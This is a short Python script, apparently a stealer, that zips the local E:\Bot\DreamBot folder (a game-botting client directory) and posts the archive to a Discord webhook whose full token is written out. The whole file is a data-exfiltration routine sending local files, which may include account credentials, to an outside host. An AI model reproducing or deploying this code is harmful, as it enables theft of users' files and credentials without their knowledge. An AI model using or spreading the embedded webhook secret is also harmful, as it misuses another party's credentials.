import requests, shutil
shutil.make_archive("dupa", "zip", "E:\Bot\DreamBot")

requests.post("https://canary.discord.com/api/webhooks/1202011487690821733/BzGW39vC2Ca_T7xOYaxFK3CGHvCbX29awKQAuUxmmBqpVfadulM-bkz3Vtc8V7NreQds", files=[("test", open("dupa.zip", "rb").read())])